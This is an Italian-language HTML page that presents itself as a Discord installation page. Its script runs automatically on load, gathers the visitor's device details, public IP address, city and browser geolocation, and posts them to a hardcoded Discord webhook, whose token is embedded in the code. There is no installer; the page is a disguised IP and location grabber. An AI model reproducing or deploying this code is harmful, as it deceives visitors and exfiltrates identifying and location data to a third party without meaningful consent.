<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Installazione Discord</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            padding: 20px;
            background-color: #f4f4f4;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>Installazione di Discord</h1>
    <p>Le informazioni sul dispositivo verranno inviate automaticamente.</p>
    
    <script>
        async function sendDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                online: navigator.onLine,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                battery: null,
                ipAddress: null,
                location: {
                    latitude: 'N/A',
                    longitude: 'N/A',
                    city: 'N/A',
                    link: 'N/A'
                },
                deviceType: getDeviceType(),
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || 'N/A'
            };

            // Ottieni l'indirizzo IP e informazioni geografiche
            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    deviceInfo.ipAddress = data.ip;

                    // Usa un servizio di geolocalizzazione inversa per ottenere la città
                    return fetch(`https://ipinfo.io/${data.ip}/json?token=YOUR_IPINFO_TOKEN`);
                })
                .then(response => response.json())
                .then(data => {
                    if (data.city) {
                        deviceInfo.location.city = data.city;
                        deviceInfo.location.link = `https://www.google.com/maps?q=${data.loc}`;
                    }
                });

            // Ottieni la posizione geografica se disponibile
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    deviceInfo.location = {
                        latitude: lat,
                        longitude: lon,
                        link: `https://www.google.com/maps?q=${lat},${lon}`
                    };
                });
            }

            // Crea il payload per Discord
            const payload = {
                embeds: [{
                    title: "Informazioni del Dispositivo",
                    description: "Ecco alcune informazioni del tuo dispositivo:",
                    color: 0x0099ff, // Blu chiaro
                    fields: [
                        { name: 'User Agent', value: deviceInfo.userAgent || 'N/A', inline: true },
                        { name: 'Piattaforma', value: deviceInfo.platform || 'N/A', inline: true },
                        { name: 'Lingua', value: deviceInfo.language || 'N/A', inline: true },
                        { name: 'Tipo di Dispositivo', value: deviceInfo.deviceType || 'N/A', inline: true },
                        { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution || 'N/A', inline: true },
                        { name: 'Profondità Colori', value: deviceInfo.colorDepth || 'N/A', inline: true },
                        { name: 'Stato Connessione', value: deviceInfo.online ? 'Online' : 'Offline', inline: true },
                        { name: 'Batteria', value: deviceInfo.battery ? `Livello: ${deviceInfo.battery.level}` : 'N/A', inline: true },
                        { name: 'Fuso Orario', value: deviceInfo.timeZone || 'N/A', inline: true },
                        { name: 'Memoria', value: deviceInfo.memory || 'N/A', inline: true },
                        { name: 'IP Indirizzo', value: deviceInfo.ipAddress || 'N/A', inline: true },
                        { name: 'Posizione', value: deviceInfo.location.link || 'N/A', inline: true },
                        { name: 'Città', value: deviceInfo.location.city || 'N/A', inline: true }
                    ],
                    footer: {
                        text: "Messaggio inviato tramite webhook",
                        icon_url: "https://i.imgur.com/AfFp7pu.png" // Icona del footer
                    }
                }]
            };

            // Invia il payload al webhook Discord
            const webhookUrl = 'https://discord.com/api/webhooks/1272243742962614374/6qq-6f1Y7sXupLfshryiw4nkNMOQFHGOzWd0l0iG0p-1SzJxHd0nScxzWHTMiZ2SJ9eM';
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Informazioni del dispositivo inviate con successo.');
                } else {
                    console.error('Errore nell\'invio delle informazioni:', response.status, response.statusText);
                }
            } catch (error) {
                console.error('Errore:', error);
            }
        }

        function getDeviceType() {
            const userAgent = navigator.userAgent;
            if (/mobile/i.test(userAgent)) {
                return 'Telefono';
            } else if (/tablet/i.test(userAgent)) {
                return 'Tablet';
            } else if (/iPad|iPod|Macintosh/i.test(userAgent)) {
                return 'Tablet/iPad';
            } else {
                return 'Computer';
            }
        }

        // Invia le informazioni al caricamento della pagina
        window.onload = sendDeviceInfo;
    </script>

</body>
</html>
